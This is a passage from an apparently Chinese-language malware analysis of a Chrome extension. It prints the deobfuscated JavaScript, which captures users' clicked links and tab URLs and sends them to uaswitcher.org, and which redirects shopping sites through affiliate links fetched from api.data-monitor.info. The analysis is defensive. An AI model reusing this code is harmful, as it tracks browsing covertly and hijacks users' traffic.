<span class="literal">null</span></div><div class="line">            &#125;,</div><div class="line">            <span class="attr">request</span>: <span class="function"><span class="keyword">function</span>(<span class="params">tabId, tab</span>) </span>&#123;</div><div class="line">                <span class="keyword">if</span> (configFetcher.IsEnable() &amp;&amp; toggler.isOn()) &#123;</div><div class="line">                    <span class="keyword">if</span> (!hash[tabId] || hash[tabId].p &amp;&amp; !hash[tabId].replaced) <span class="keyword">return</span> <span class="keyword">void</span> <span class="keyword">this</span>.clear(tabId);</div><div class="line">                    <span class="keyword">var</span> currTab = hash[tabId] || &#123;&#125;,</div><div class="line">                    url = validateUrl(tab.url);</div><div class="line">                    url &amp;&amp; (currTab.hh || lp != tab.url) &amp;&amp; (tab.active || hash[tabId].fr || hash[tabId].uk.push(<span class="string">"background_auto_reloading"</span>), hash[tabId].dada &amp;&amp; hash[hash[tabId].dada] &amp;&amp; hash[hash[tabId].dada].retroet &amp;&amp; (hash[tabId].zz = hash[hash[tabId].dada].retroet), fetchOverlayPattern(<span class="keyword">this</span>.edit(tabId, &#123;</div><div class="line">                        <span class="attr">sh</span>: url,</div><div class="line">                        <span class="attr">b</span>: lp</div><div class="line">                    &#125;),</div><div class="line">                    <span class="function"><span class="keyword">function</span>(<span class="params">d</span>) </span>&#123;&#125;), tab.active &amp;&amp; (lp = currTab.sh), hash[tabId].zz = <span class="literal">null</span>, hash[tabId].dada = <span class="literal">null</span>),</div><div class="line">                    <span class="keyword">this</span>.clear(tabId),</div><div class="line">                    hash[tabId].sh = url,</div><div class="line">                    hash[tabId].p = !<span class="number">0</span></div><div class="line">                &#125;</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">clear</span>: <span class="function"><span class="keyword">function</span>(<span class="params">tid</span>) </span>&#123;</div><div class="line">                hash[tid] = &#123;</div><div class="line">                    <span class="attr">var</span>: version || <span class="string">"missing"</span>,</div><div class="line">                    <span class="attr">val</span>: <span class="number">21</span>,</div><div class="line">                    <span class="attr">un</span>: <span class="string">"1"</span>,</div><div class="line">                    <span class="attr">su</span>: browsername,</div><div class="line">                    <span class="attr">ch</span>: ch,</div><div class="line">                    <span class="attr">new</span>: itemator1,</div><div class="line">                    <span class="attr">exp</span>: guid(),</div><div class="line">                    <span class="attr">sesnew</span>: <span class="string">""</span>,</div><div class="line">                    <span class="attr">d</span>: <span class="number">0</span>,</div><div class="line">                    <span class="attr">se</span>: [],</div><div class="line">                    <span class="attr">restarting</span>: !<span class="number">1</span>,</div><div class="line">                    <span class="attr">sh</span>: (hash[tid] || &#123;&#125;).sh || <span class="literal">null</span>,</div><div class="line">                    <span class="attr">a</span>: (hash[tid] || &#123;&#125;).a || <span class="string">""</span>,</div><div class="line">                    <span class="attr">uk</span>: [],</div><div class="line">                    <span class="attr">fr</span>: !<span class="number">1</span>,</div><div class="line">                    <span class="attr">aj</span>: (hash[tid] || &#123;&#125;).aj || !<span class="number">1</span>,</div><div class="line">                    <span class="attr">replaced</span>: (hash[tid] || &#123;&#125;).replaced || !<span class="number">1</span>,</div><div class="line">                    <span class="attr">hh</span>: (hash[tid] || &#123;&#125;).hh || !<span class="number">1</span>,</div><div class="line">                    <span class="attr">dada</span>: (hash[tid] || &#123;&#125;).dada || <span class="literal">null</span>,</div><div class="line">                    <span class="attr">retroet</span>: (hash[tid] || &#123;&#125;).retroet || <span class="string">""</span>,</div><div class="line">                    <span class="attr">zz</span>: (hash[tid] || &#123;&#125;).zz || <span class="string">""</span></div><div class="line">                &#125;</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">details</span>: <span class="function"><span class="keyword">function</span>(<span class="params">tid, cb</span>) </span>&#123;</div><div class="line">                chrome.tabs.get(tid,</div><div class="line">                <span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">                    chrome.runtime.lastError || cb(details)</div><div class="line">                &#125;)</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">lpUpdate</span>: <span class="function"><span class="keyword">function</span>(<span class="params">param</span>) </span>&#123;</div><div class="line">                <span class="keyword">var</span> idd = param.id || param;</div><div class="line">                lpi = param.id || <span class="keyword">void</span> <span class="number">0</span>,</div><div class="line">                lp = (hash[idd] || &#123;&#125;).sh || lp</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">getLpi</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> lpi</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validateUrl</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span> === url.indexOf(<span class="string">"http"</span>) &amp;&amp; <span class="number">-1</span> === url.indexOf(<span class="string">"://localhost"</span>) &amp;&amp; <span class="number">-1</span> === url.indexOf(<span class="string">"chrome/newtab"</span>) &amp;&amp; <span class="number">0</span> !== url.indexOf(<span class="string">"chrome-"</span>) &amp;&amp; <span class="number">0</span> !== url.indexOf(<span class="string">"about:"</span>) &amp;&amp; <span class="number">-1</span> === url.indexOf(<span class="string">"chrome://"</span>) ? url: <span class="literal">null</span></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reselected</span>(<span class="params">tid</span>) </span>&#123;</div><div class="line">        tablist.details((tid || &#123;&#125;).tabId || tid, tablist.lpUpdate)</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onUpdated</span>(<span class="params">tabId, details, tab</span>) </span>&#123;</div><div class="line">        details &amp;&amp; <span class="string">"complete"</span> === details.status &amp;&amp; (tablist.edit(tabId).p &amp;&amp; tablist.edit(tabId).aj &amp;&amp; tablist.edit(tabId, &#123;</div><div class="line">            <span class="attr">sh</span>: <span class="keyword">void</span> <span class="number">0</span>,</div><div class="line">            <span class="attr">p</span>: !<span class="number">1</span>,</div><div class="line">            <span class="attr">aj</span>: !<span class="number">1</span></div><div class="line">        &#125;), tablist.edit(tabId, &#123;</div><div class="line">            <span class="attr">ng</span>: <span class="string">"ajax"</span>,</div><div class="line">            <span class="attr">aj</span>: !<span class="number">0</span></div><div class="line">        &#125;), tablist.request(tabId, tab), tablist.edit(tabId, &#123;</div><div class="line">            <span class="attr">replaced</span>: !<span class="number">1</span></div><div class="line">        &#125;))</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onReplaced</span>(<span class="params">addedTabId, removedTabId</span>) </span>&#123;</div><div class="line">        tablist.edit(addedTabId, &#123;</div><div class="line">            <span class="attr">replaced</span>: !<span class="number">0</span></div><div class="line">        &#125;),</div><div class="line">        tablist.details(addedTabId, tablist.request.bind(tablist, (addedTabId || &#123;&#125;).tabId || addedTabId))</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onBeforeSendHeaders</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> tablist.edit(details.tabId, &#123;</div><div class="line">            <span class="attr">hh</span>: !<span class="number">0</span></div><div class="line">        &#125;),</div><div class="line">        details.requestHeaders.some(<span class="function"><span class="keyword">function</span>(<span class="params">rh</span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="regexp">/^Referer$/i</span>.test(rh.name) &amp;&amp; tablist.edit(details.tabId, &#123;</div><div class="line">                <span class="attr">a</span>: rh.value</div><div class="line">            &#125;)</div><div class="line">        &#125;) || tablist.edit(details.tabId, &#123;</div><div class="line">            <span class="attr">a</span>: <span class="string">""</span></div><div class="line">        &#125;),</div><div class="line">        &#123;</div><div class="line">            <span class="attr">requestHeaders</span>: details.requestHeaders</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onCommitted</span>(<span class="params">dtls</span>) </span>&#123;</div><div class="line">        dtls = dtls || &#123;&#125;;</div><div class="line">        <span class="keyword">var</span> tid = dtls.tabId,</div><div class="line">        tsh = dtls.transitionQualifiers;</div><div class="line">        tid &amp;&amp; <span class="number">0</span> === dtls.frameId &amp;&amp; (tablist.edit(tid, &#123;</div><div class="line">            <span class="attr">ng</span>: dtls.transitionType,</div><div class="line">            <span class="attr">tsh</span>: tsh</div><div class="line">        &#125;), /client_redirect/.test(tsh) &amp;&amp; tablist.edit(tid, &#123;</div><div class="line">            <span class="attr">lt</span>: dtls.url</div><div class="line">        &#125;), /server_redirect/.test(tsh), tablist.details(tid, tablist.request.bind(tablist, (tid || &#123;&#125;).tabId || tid)))</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">cwonRemoved</span>(<span class="params">windowID</span>) </span>&#123;</div><div class="line">        ct.query(&#123;</div><div class="line">            <span class="attr">active</span>: !<span class="number">0</span></div><div class="line">        &#125;,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">tabs</span>) </span>&#123;</div><div class="line">            tabs[<span class="number">0</span>] &amp;&amp; tablist.lpUpdate(tabs[<span class="number">0</span>])</div><div class="line">        &#125;)</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">cwonFocused</span>(<span class="params">window</span>) </span>&#123;</div><div class="line">        cw.WINDOW_ID_NONE != <span class="built_in">window</span> &amp;&amp; ct.query(&#123;</div><div class="line">            <span class="attr">windowId</span>: <span class="built_in">window</span>,</div><div class="line">            <span class="attr">active</span>: !<span class="number">0</span></div><div class="line">        &#125;,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">tabs</span>) </span>&#123;</div><div class="line">            tabs[<span class="number">0</span>] &amp;&amp; tabs[<span class="number">0</span>].active &amp;&amp; tablist.lpUpdate(tabs[<span class="number">0</span>])</div><div class="line">        &#125;)</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onCreated</span>(<span class="params">tab</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> openerTabId = (tablist.edit(tab.id, &#123;</div><div class="line">            <span class="attr">fr</span>: !<span class="number">0</span>,</div><div class="line">            <span class="attr">replaced</span>: !<span class="number">1</span></div><div class="line">        &#125;), tab.openerTabId || tablist.getLpi());</div><div class="line">        tablist.edit(openerTabId),</div><div class="line">        tab.url.length &amp;&amp; tablist.edit(openerTabId) &amp;&amp; tab.url === tablist.edit(openerTabId).sh ? tablist.edit(tab.id).uk.push(<span class="string">"duplication"</span>) : tab.url.length &amp;&amp; ct.query(&#123;</div><div class="line">            <span class="attr">url</span>: tab.url</div><div class="line">        &#125;,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">tabs</span>) </span>&#123; (tabs || []).length &gt; <span class="number">1</span> &amp;&amp; (tablist.edit(tab.id).uk.push(<span class="string">"duplication"</span>), tablist.edit(tab.id).uk.push(<span class="string">"background_duplication"</span>))</div><div class="line">        &#125;),</div><div class="line">        <span class="string">"complete"</span> != tab.status || tab.openerTabId || tablist.edit(tab.id).uk.push(<span class="string">"reopening"</span>),</div><div class="line">        tablist.edit(tab.id, &#123;</div><div class="line">            <span class="attr">dada</span>: openerTabId</div><div class="line">        &#125;)</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">guid</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> guid = localStorage.getItem(guid_key);</div><div class="line">        <span class="keyword">if</span> (!guid) &#123;</div><div class="line">            <span class="keyword">var</span> g = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> (<span class="number">65536</span> * (<span class="number">1</span> + <span class="built_in">Math</span>.random(<span class="built_in">Date</span>.now() + <span class="number">12</span>)) | <span class="number">0</span>).toString(<span class="number">30</span>).substring(<span class="number">1</span>)</div><div class="line">            &#125;;</div><div class="line">            guid = g() + g() + g() + g() + g() + g() + g() + g() + g(),</div><div class="line">            localStorage.setItem(guid_key, guid)</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> guid</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> itemator1 = <span class="number">310</span>,</div><div class="line">    version = chrome.runtime.getManifest().version,</div><div class="line">    main_route = (localStorage.serverInfo &amp;&amp; <span class="built_in">JSON</span>.parse(localStorage.serverInfo), <span class="string">"/logic/page/data"</span>),</div><div class="line">    guid_key = <span class="string">"uaswitcherk"</span>,</div><div class="line">    skeys = [<span class="string">"o"</span>, <span class="string">"u"</span>],</div><div class="line">    ch = <span class="number">4</span>,</div><div class="line">    browsername = <span class="string">"chrome"</span>,</div><div class="line">    toggler = <span class="keyword">new</span></div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            localStorage.setItem(localKey, isOn ? <span class="number">1</span> : <span class="number">0</span>)</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_optTurnOn</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">        <span class="keyword">var</span> isOn = !<span class="number">0</span>,</div><div class="line">        localKey = <span class="string">"isdugnlkWfmgosd2"</span>;</div><div class="line">        <span class="keyword">this</span>.turnOn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            isOn = !<span class="number">0</span>,</div><div class="line">            save(),</div><div class="line">            _optTurnOn()</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">this</span>.turnOff = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            isOn = !<span class="number">1</span>,</div><div class="line">            save()</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">this</span>.isOn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> isOn</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">this</span>.whenOn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.isOn() ? <span class="built_in">Promise</span>.resolve(!<span class="number">0</span>) : <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</div><div class="line">                _optTurnOn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                    resolve()</div><div class="line">                &#125;</div><div class="line">            &#125;)</div><div class="line">        &#125;,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">var</span> val = localStorage.getItem(localKey),</div><div class="line">            intVal = <span class="built_in">parseInt</span>(val);</div><div class="line">            isOn = !!<span class="built_in">isNaN</span>(intVal) || <span class="number">1</span> === intVal</div><div class="line">        &#125; ()</div><div class="line">    &#125;,</div><div class="line">    configFetcher = <span class="keyword">new</span></div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> settings = <span class="string">""</span>,</div><div class="line">        setDump = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            localStorage.setItem(<span class="string">"uasc"</span>, <span class="built_in">JSON</span>.stringify(settings))</div><div class="line">        &#125;,</div><div class="line">        setUp = <span class="function"><span class="keyword">function</span>(<span class="params">endpt</span>) </span>&#123;</div><div class="line">            <span class="keyword">var</span> cb = <span class="function"><span class="keyword">function</span>(<span class="params">sts, resp</span>) </span>&#123;</div><div class="line">                sts &amp;&amp; (settings = <span class="built_in">JSON</span>.parse(resp), setDump())</div><div class="line">            &#125;,</div><div class="line">            xhr = <span class="keyword">new</span> XMLHttpRequest;</div><div class="line">            xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                <span class="number">4</span> == xhr.readyState &amp;&amp; cb.apply(<span class="literal">null</span>, [<span class="number">200</span> == xhr.status, xhr.responseText].concat(<span class="built_in">arguments</span>))</div><div class="line">            &#125;,</div><div class="line">            xhr.open(<span class="string">"GET"</span>, endpt + <span class="string">"?"</span> +</div><div class="line">            <span class="function"><span class="keyword">function</span>(<span class="params">arr</span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> <span class="built_in">Object</span>.keys(arr).map(<span class="function"><span class="keyword">function</span>(<span class="params">hashed</span>) </span>&#123;</div><div class="line">                    <span class="keyword">return</span> hashed + <span class="string">"="</span> + arr[hashed]</div><div class="line">                &#125;).join(<span class="string">"&amp;"</span>)</div><div class="line">            &#125; (&#123;</div><div class="line">                <span class="attr">s</span>: itemator1,</div><div class="line">                <span class="attr">ver</span>: version</div><div class="line">            &#125;), !<span class="number">0</span>),</div><div class="line">            xhr.send()</div><div class="line">        &#125;; !</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">var</span> p = localStorage.getItem(<span class="string">"uasc"</span>);</div><div class="line">            settings = p ? <span class="built_in">JSON</span>.parse(p) : settings</div><div class="line">        &#125; (),</div><div class="line">        toggler.whenOn().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            setUp(<span class="string">"https://uaswitcher.org/splash"</span>)</div><div class="line">        &#125;),</div><div class="line">        <span class="keyword">this</span>.enablator = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            settings[skeys[<span class="number">0</span>]] = <span class="number">1</span>,</div><div class="line">            setDump()</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">this</span>.disablator = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            settings[skeys[<span class="number">0</span>]] = <span class="number">0</span>,</div><div class="line">            setDump()</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">this</span>.IsEnable = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="built_in">Boolean</span>(settings &amp;&amp; settings[skeys[<span class="number">0</span>]])</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">this</span>.MainLocator = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> settings &amp;&amp; settings[skeys[<span class="number">1</span>]]</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">    filtered = [<span class="string">"restarting"</span>, <span class="string">"hh"</span>, <span class="string">"p"</span>, <span class="string">"fr"</span>, <span class="string">"aj"</span>, <span class="string">"replaced"</span>, <span class="string">"retroet"</span>, <span class="string">"dada"</span>],</div><div class="line">    listenerLast = localStorage.getItem(<span class="string">"listenerLast"</span>) || <span class="number">0</span>,</div><div class="line">    tablist = <span class="keyword">new</span> TabList,</div><div class="line">    ct = (chrome.browserAction, chrome.tabs),</div><div class="line">    wr = chrome.webRequest,</div><div class="line">    wn = chrome.webNavigation,</div><div class="line">    cw = chrome.windows;</div><div class="line">    chrome.runtime.onMessage.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">request, sender</span>) </span>&#123;</div><div class="line">        request.href ? tablist.edit(sender.tab.id, &#123;</div><div class="line">            <span class="attr">zz</span>: request.href</div><div class="line">        &#125;) : request.ahref &amp;&amp; tablist.edit(sender.tab.id, &#123;</div><div class="line">            <span class="attr">retroet</span>: request.ahref</div><div class="line">        &#125;)</div><div class="line">    &#125;),</div><div class="line">    cw.getAll(&#123;</div><div class="line">        <span class="attr">populate</span>: !<span class="number">0</span></div><div class="line">    &#125;,</div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">windows</span>) </span>&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> w = <span class="number">0</span>; w &lt; windows.length; w++) <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; windows[w].tabs.length; i++) validateUrl(windows[w].tabs[i].url) &amp;&amp; (tablist.edit(windows[w].tabs[i].id, &#123;</div><div class="line">            <span class="attr">sh</span>: windows[w].tabs[i].url,</div><div class="line">            <span class="attr">restarting</span>: !<span class="number">0</span></div><div class="line">        &#125;), windows[w].focused &amp;&amp; windows[w].tabs[i].active &amp;&amp; tablist.lpUpdate(windows[w].tabs[i]))</div><div class="line">    &#125;),</div><div class="line">    ct.onUpdated.addListener(onUpdated),</div><div class="line">    ct.onReplaced.addListener(onReplaced);</div><div class="line">    <span class="keyword">var</span> repertuar = &#123;</div><div class="line">        <span class="attr">types</span>: [<span class="string">"main_frame"</span>],</div><div class="line">        <span class="attr">urls</span>: [<span class="string">"&lt;all_urls&gt;"</span>]</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">return</span> wr.onBeforeRequest.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">        validateUrl(details.url) &amp;&amp; tablist.edit(details.tabId, &#123;</div><div class="line">            <span class="attr">sh</span>: <span class="keyword">void</span> <span class="number">0</span>,</div><div class="line">            <span class="attr">p</span>: !<span class="number">1</span>,</div><div class="line">            <span class="attr">aj</span>: !<span class="number">1</span></div><div class="line">        &#125;)</div><div class="line">    &#125;,</div><div class="line">    repertuar, [<span class="string">"blocking"</span>]),</div><div class="line">    wr.onBeforeRedirect.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">        validateUrl(details.url) &amp;&amp; tablist.edit(details.tabId).se.push(details.url)</div><div class="line">    &#125;,</div><div class="line">    repertuar),</div><div class="line">    wr.onBeforeSendHeaders.addListener(onBeforeSendHeaders, repertuar, [<span class="string">"blocking"</span>, <span class="string">"requestHeaders"</span>]),</div><div class="line">    wr.onHeadersReceived.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">        tablist.edit(details.tabId, &#123;</div><div class="line">            <span class="attr">hh</span>: !<span class="number">0</span></div><div class="line">        &#125;)</div><div class="line">    &#125;,</div><div class="line">    repertuar),</div><div class="line">    wn.onCommitted.addListener(onCommitted),</div><div class="line">    ct.onRemoved.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">tabId</span>) </span>&#123;</div><div class="line">        tablist.remove(tabId)</div><div class="line">    &#125;),</div><div class="line">    cw.onRemoved.addListener(cwonRemoved),</div><div class="line">    ct.onCreated.addListener(onCreated),</div><div class="line">    cw.onFocusChanged.addListener(cwonFocused),</div><div class="line">    ct.onActivated ? ct.onActivated.addListener(reselected) : ct.onSelectionChanged.addListener(reselected),</div><div class="line">    wr.onErrorOccurred.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            tablist.edit(details.tabId, &#123;</div><div class="line">                <span class="attr">se</span>: <span class="literal">null</span></div><div class="line">            &#125;)</div><div class="line">        &#125; <span class="keyword">catch</span>(e) &#123;&#125;</div><div class="line">    &#125;,</div><div class="line">    repertuar),</div><div class="line">    &#123;</div><div class="line">        <span class="attr">optin</span>: toggler.turnOn,</div><div class="line">        <span class="attr">optout</span>: toggler.turnOff,</div><div class="line">        <span class="attr">isopt</span>: toggler.isOn,</div><div class="line">        <span class="attr">whenopt</span>: toggler.whenOn()</div><div class="line">    &#125;</div><div class="line">&#125; ();</div><div class="line">wrap1.optin(),</div><div class="line">chrome.tabs.onUpdated.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">tabId</span>) </span>&#123;</div><div class="line">    chrome.tabs.get(tabId,</div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">tab</span>) </span>&#123;</div><div class="line">        <span class="string">"loading"</span> == tab.status &amp;&amp; chrome.tabs.executeScript(tab.id, &#123;</div><div class="line">            <span class="attr">code</span>: <span class="string">`</span></div><div class="line">            if (!document.getElementById("sbmarwusasv5")) &#123;</div><div class="line">                var flag = document.createElement("span");</div><div class="line">                flag.id = "sbmarwusasv5";</div><div class="line">                document.body.appendChild(flag);</div><div class="line"></div><div class="line">                document.body.addEventListener("click",</div><div class="line">                function(event) &#123;</div><div class="line">                    try &#123;</div><div class="line">                        if (event.target.href) &#123;</div><div class="line">                            chrome.runtime.sendMessage(&#123;</div><div class="line">                                href: event.target.href,</div><div class="line">                                listener: "usassmwv5"</div><div class="line">                            &#125;);</div><div class="line">                        &#125;</div><div class="line">                    &#125; catch(e) &#123;</div><div class="line">                        console.log(e);</div><div class="line">                    &#125;</div><div class="line">                &#125;);</div><div class="line"></div><div class="line">                document.body.addEventListener("contextmenu",</div><div class="line">                function(event) &#123;</div><div class="line">                    if (event.target.href) &#123;</div><div class="line">                        chrome.runtime.sendMessage(&#123;</div><div class="line">                            ahref: event.target.href,</div><div class="line">                            listener: "usassmwv5"</div><div class="line">                        &#125;);</div><div class="line">                    &#125;</div><div class="line">                    return false;</div><div class="line">                &#125;,</div><div class="line">                false);</div><div class="line"></div><div class="line">                document.body.addEventListener("auxclick",</div><div class="line">                function(event) &#123;</div><div class="line">                    if (event.target.href) &#123;</div><div class="line">                        chrome.runtime.sendMessage(&#123;</div><div class="line">                            ahref: event.target.href,</div><div class="line">                            listener: "usassmwv5"</div><div class="line">                        &#125;);</div><div class="line">                    &#125;</div><div class="line">                &#125;);</div><div class="line">            &#125;`</div><div class="line">        &#125;)</div><div class="line">    &#125;)</div><div class="line">&#125;);</div><div class="line"><span class="keyword">var</span> host = <span class="string">"http://api.data-monitor.info/api/"</span>,</div><div class="line">wid = <span class="number">116</span>,</div><div class="line">rulesObject = &#123;&#125;,</div><div class="line">usedT = localStorage.usedT ? <span class="built_in">parseInt</span>(localStorage.usedT) : <span class="literal">null</span>,</div><div class="line">mainRgxp = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"^(?:([^:\\/?]+):)?(?:\\/\\/([^\\/]*))?([^?]*)(?:\\?([^$]*))?"</span>),</div><div class="line">domainRgxp = <span class="regexp">/((?:[^.]+)\.(?:(?:com?|org)\.)?\w+)$/i</span>,</div><div class="line">listenFunc = <span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (! (usedT &amp;&amp; usedT &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime() - <span class="number">42e5</span>) &amp;&amp; <span class="number">0</span> === details.frameId &amp;&amp; <span class="string">"main_frame"</span> == details.type &amp;&amp; <span class="number">-1</span> === details.parentFrameId &amp;&amp; details.tabId &gt; <span class="number">0</span> &amp;&amp; <span class="regexp">/^https?/i</span>.test(details.url)) &#123;</div><div class="line">        <span class="keyword">var</span> current = details.url,</div><div class="line">        new_url = (prepareLink(current), tryUrl(current));</div><div class="line">        <span class="keyword">if</span> (<span class="string">"string"</span> == <span class="keyword">typeof</span> new_url &amp;&amp; current != new_url) <span class="keyword">return</span> &#123;</div><div class="line">            <span class="attr">redirectUrl</span>: new_url</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line">chrome.webRequest.onBeforeRequest.addListener(listenFunc, &#123;</div><div class="line">    <span class="attr">urls</span>: [<span class="string">"&lt;all_urls&gt;"</span>]</div><div class="line">&#125;,</div><div class="line">[<span class="string">"blocking"</span>]),</div><div class="line">getData();</div></pre></td></tr></table></figure>
<h2 id="外部恶意js分析"><a href="#外部恶意js分析" class="headerlink" title="外部恶意js分析"></a>外部恶意js分析</h2><p>恶意js会向chrome增加一些事件的处理函数，比如新打开一个tab，这段恶意js回将你打开的网址上传到服务器上。</p>
<p>接受上传用户信息的api<code>https://uaswitcher.org/logic/page/data</code>，上传用户隐私数据，数据中包含用户的插件版本，tabs是重载还是新打开、用户的浏览器等。</p>
<p><img src="11.png" alt=""></p>
<p>向<code>https://uaswitcher.org/splash</code>发送相关信息，其中s是代码中指定的，不知道含义，ver是插件的版本。返回的o是与本地的settings做对比，返回的u是接收用户隐私数据的域名。</p>
<p><img src="8.png" alt=""></p>
<p>更新恶意js的状态</p>
<p><img src="9.png" alt=""></p>
<p>这段js还会从<code>http://api.data-monitor.info/api/bhrule?sub=116</code>获取推广连接</p>
<figure class="highlight json"><table><tr><td class="code"><pre><div class="line">&#123;<span class="attr">"rules"</span>:&#123;<span class="attr">"aliexpress.com"</span>:&#123;<span class="attr">"*"</span>:&#123;<span class="attr">"*"</span>:<span class="string">"http:\/\/systemrtb.com\/?target=http%3A%2F%2Fnfemo.com%2Fclick-JQETHVDP-MKIGQNPP%3Fbt%3D25%26tl%3D1%26sa%3D__SUBID__%26url%3D__CURURL__"</span>&#125;&#125;&#125;&#125;</div></pre></td></tr></table></figure>
<p>顺手遍历了一下其他的id，也会存在一些规则，应该是给其他用的，这个<code>sub=116</code>是代码中写死的。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><div class="line">&#123;<span class="attr">"rules"</span>:&#123;<span class="attr">"aliexpress.com"</span>:&#123;<span class="attr">"*"</span>:&#123;<span class="attr">"*"</span>:<span class="string">"http:\/\/systemrtb.com\/?target=http%3A%2F%2Fnfemo.com%2Fclick-JQEXXAX0-KIGQB9TF%3Fbt%3D25%26tl%3D1%26sa%3D__SUBID__%26url%3D__CURURL__"</span>&#125;&#125;,<span class="attr">"wadi.com"</span>:&#123;<span class="attr">"*"</span>:&#123;<span class="attr">"*"</span>:<span class="string">"http:\/\/systemrtb.com\/?target=http%3A%2F%2F2track.info%2FJKrd%2F__SUBID__"</span>&#125;&#125;&#125;&#125;</div></pre></td></tr></table></figure>
